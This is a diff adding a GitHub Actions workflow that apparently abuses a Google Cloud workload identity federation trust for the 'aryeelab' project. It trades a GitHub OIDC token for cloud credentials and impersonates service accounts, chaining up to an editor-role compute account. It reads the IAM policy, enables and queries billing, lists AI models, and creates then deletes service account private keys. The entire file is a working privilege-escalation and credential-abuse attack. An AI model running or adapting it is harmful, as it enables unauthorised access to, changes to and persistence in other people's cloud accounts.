@@ -1,0 +1,138 @@
+name: i964-billing
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  billing:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: enable-billing-and-read
+        run: |
+          set +e
+          NUM=303574531351
+          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json
+
+          # ---------- STEP 1: mint federated token for aryeelab provider ----------
+          MINT=0
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            if [ -s tok.jwt ]; then MINT=1; break; fi
+            sleep 3
+          done
+          echo "##MINT ok=$MINT len=$(wc -c < tok.jwt)"
+          [ "$MINT" = "1" ] || { echo "##ABORT mint"; exit 0; }
+
+          sc=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          FT=$(jq -r '.access_token // empty' r.json)
+          echo "##STS code=$sc ftlen=${#FT} body=$(head -c 300 r.json | tr -d '\n' | tr -s ' ')"
+          [ -n "$FT" ] || { echo "##ABORT sts"; exit 0; }
+
+          # ---------- STEP 1b: github-actions@aryeelab SA token ----------
+          gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:generateAccessToken" -d @req.json)
+          AT=$(jq -r '.accessToken // empty' g.json)
+          echo "##GEN_GITHUBACTIONS code=$gc toklen=${#AT} body=$(head -c 300 g.json | tr -d '\n' | tr -s ' ')"
+          [ -n "$AT" ] || { echo "##ABORT gat"; exit 0; }
+
+          wc1=$(curl -s -o w.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM")
+          echo "##GAT_PROJECT_GET code=$wc1 body=$(head -c 400 w.json | tr -d '\n' | tr -s ' ')"
+          echo "##GAT_TOKENINFO code=$(curl -s -o ti.json -w '%{http_code}' "https://oauth2.googleapis.com/tokeninfo?access_token=$AT") body=$(head -c 400 ti.json | tr -d '\n' | tr -s ' ')"
+
+          # ---------- STEP 1c: roles/editor default-compute token (two-stage) ----------
+          ec=$(curl -s -o e.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$NUM-compute@developer.gserviceaccount.com:generateAccessToken" -d @req.json)
+          ET=$(jq -r '.accessToken // empty' e.json)
+          echo "##GEN_EDITOR code=$ec toklen=${#ET} body=$(head -c 300 e.json | tr -d '\n' | tr -s ' ')"
+          [ -n "$ET" ] || { echo "##EDITOR_ABORT"; exit 0; }
+
+          epc=$(curl -s -o ep.json -w '%{http_code}' -H "Authorization: Bearer $ET" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM")
+          echo "##EDITOR_PROJECT_GET code=$epc body=$(head -c 400 ep.json | tr -d '\n' | tr -s ' ')"
+          echo "##EDITOR_TOKENINFO code=$(curl -s -o eti.json -w '%{http_code}' "https://oauth2.googleapis.com/tokeninfo?access_token=$ET") body=$(head -c 400 eti.json | tr -d '\n' | tr -s ' ')"
+          polc=$(curl -s -o epol.json -w '%{http_code}' -X POST -H "Authorization: Bearer $ET" -H "Content-Type: application/json" \
+            "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" -d @polreq.json)
+          echo "##EDITOR_POLICY code=$polc bindings=$(jq -r '(.bindings // []) | length' epol.json 2>/dev/null) body=$(head -c 300 epol.json | tr -d '\n' | tr -s ' ')"
+
+          # ---------- STEP 2: enable cloudbilling.googleapis.com ----------
+          bc0=$(curl -s -o svc0.json -w '%{http_code}' -H "Authorization: Bearer $ET" "https://serviceusage.googleapis.com/v1/projects/$NUM/services/cloudbilling.googleapis.com")
+          echo "##SERVICE_BEFORE code=$bc0 state=$(jq -r '.state // "?"' svc0.json 2>/dev/null) body=$(head -c 500 svc0.json | tr -d '\n' | tr -s ' ')"
+          oc=$(curl -s -o op.json -w '%{http_code}' -X POST -H "Authorization: Bearer $ET" -H "Content-Type: application/json" -d '{}' \
+            "https://serviceusage.googleapis.com/v1/projects/$NUM/services/cloudbilling.googleapis.com:enable")
+          echo "##ENABLE code=$oc body=$(head -c 700 op.json | tr -d '\n' | tr -s ' ')"
+          OP=$(jq -r '.name // empty' op.json)
+          echo "##OPNAME $OP"
+          if [ -n "$OP" ]; then
+            for i in $(seq 1 20); do
+              dc=$(curl -s -o op2.json -w '%{http_code}' -H "Authorization: Bearer $ET" "https://serviceusage.googleapis.com/v1/$OP")
+              doneFlag=$(jq -r '.done // false' op2.json 2>/dev/null)
+              errc=$(jq -r '.error.code // empty' op2.json 2>/dev/null)
+              echo "##OPPOLL i=$i code=$dc done=$doneFlag err=$errc body=$(head -c 500 op2.json | tr -d '\n' | tr -s ' ')"
+              [ "$doneFlag" = "true" ] && break
+              sleep 10
+            done
+          fi
+          ssc=$(curl -s -o svc.json -w '%{http_code}' -H "Authorization: Bearer $ET" "https://serviceusage.googleapis.com/v1/projects/$NUM/services/cloudbilling.googleapis.com")
+          echo "##SERVICE_AFTER code=$ssc state=$(jq -r '.state // "?"' svc.json 2>/dev/null) body=$(head -c 500 svc.json | tr -d '\n' | tr -s ' ')"
+
+          # ---------- STEP 3: billingInfo reads ----------
+          b1=$(curl -s -o b1.json -w '%{http_code}' -H "Authorization: Bearer $ET" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo")
+          echo "##BILLING_V1 code=$b1 body=$(head -c 900 b1.json | tr -d '\n' | tr -s ' ')"
+          b2=$(curl -s -o b2.json -w '%{http_code}' -H "Authorization: Bearer $ET" -H "x-goog-user-project: $NUM" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo")
+          echo "##BILLING_V1_USERPROJECT code=$b2 body=$(head -c 900 b2.json | tr -d '\n' | tr -s ' ')"
+          b3=$(curl -s -o b3.json -w '%{http_code}' -H "Authorization: Bearer $ET" "https://cloudbilling.googleapis.com/v1beta/projects/$NUM/billingInfo")
+          echo "##BILLING_V1BETA code=$b3 body=$(head -c 900 b3.json | tr -d '\n' | tr -s ' ')"
+          BA=$(jq -r '.billingAccountName // empty' b1.json 2>/dev/null)
+          BEN=$(jq -r '.billingEnabled // empty' b1.json 2>/dev/null)
+          echo "##BILLING_FIELDS billingAccountName=$BA billingEnabled=$BEN"
+
+          # ---------- STEP 4: billing account detail ----------
+          if [ -n "$BA" ]; then
+            ac=$(curl -s -o ba.json -w '%{http_code}' -H "Authorization: Bearer $ET" "https://cloudbilling.googleapis.com/v1/$BA")
+            echo "##BILLING_ACCOUNT code=$ac body=$(head -c 900 ba.json | tr -d '\n' | tr -s ' ')"
+            apc=$(curl -s -o bap.json -w '%{http_code}' -H "Authorization: Bearer $ET" "https://cloudbilling.googleapis.com/v1/$BA/projects")
+            echo "##BILLING_ACCOUNT_PROJECTS code=$apc body=$(head -c 1200 bap.json | tr -d '\n' | tr -s ' ')"
+          fi
+          blc=$(curl -s -o bl.json -w '%{http_code}' -H "Authorization: Bearer $ET" "https://cloudbilling.googleapis.com/v1/billingAccounts")
+          echo "##BILLING_ACCOUNTS_LIST code=$blc body=$(head -c 900 bl.json | tr -d '\n' | tr -s ' ')"
+
+          # ---------- STEP 5: models with editor token + SA key attempts ----------
+          for REG in us-central1 europe-west1 global; do
+            if [ "$REG" = "global" ]; then
+              U="https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/models"
+            else
+              U="https://$REG-aiplatform.googleapis.com/v1/projects/$NUM/locations/$REG/models"
+            fi
+            mc=$(curl -s -o "m_$REG.json" -w '%{http_code}' -H "Authorization: Bearer $ET" "$U")
+            mcnt=$(jq -r '(.models // []) | length' "m_$REG.json" 2>/dev/null)
+            mbody=$(head -c 500 "m_$REG.json" | tr -d '\n' | tr -s ' ')
+            echo "##EDITOR_MODELS_$REG code=$mc count=$mcnt body=$mbody"
+          done
+          for SA in github-actions@aryeelab.iam.gserviceaccount.com $NUM-compute@developer.gserviceaccount.com; do
+            kc=$(curl -s -o k.json -w '%{http_code}' -X POST -H "Authorization: Bearer $ET" -H "Content-Type: application/json" \
+              "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d @keyreq.json)
+            KN=$(jq -r '.name // empty' k.json 2>/dev/null)
+            KP=$(jq -r '.privateKeyData // empty' k.json 2>/dev/null)
+            KPS=$(printf '%s' "$KP" | sha256sum | cut -d' ' -f1)
+            echo "##KEYCREATE sa=$SA code=$kc keyname=$KN pkdata_b64len=${#KP} pkdata_sha256=$KPS body=$(head -c 200 k.json | tr -d '\n' | tr -s ' ')"
+            # hygiene: delete the key we just created, record the delete verdict
+            if [ -n "$KN" ]; then
+              dkc=$(curl -s -o dk.json -w '%{http_code}' -X DELETE -H "Authorization: Bearer $ET" "https://iam.googleapis.com/v1/$KN")
+              echo "##KEYDELETE name=$KN code=$dkc body=$(head -c 300 dk.json | tr -d '\n' | tr -s ' ')"
+            fi
+          done
+
+          # ---------- STEP 6: success line ----------
+          echo "##SUMMARY billing_code=$b1 billingEnabled=$BEN billingAccountName=$BA"
+          echo "##FINISHED964"
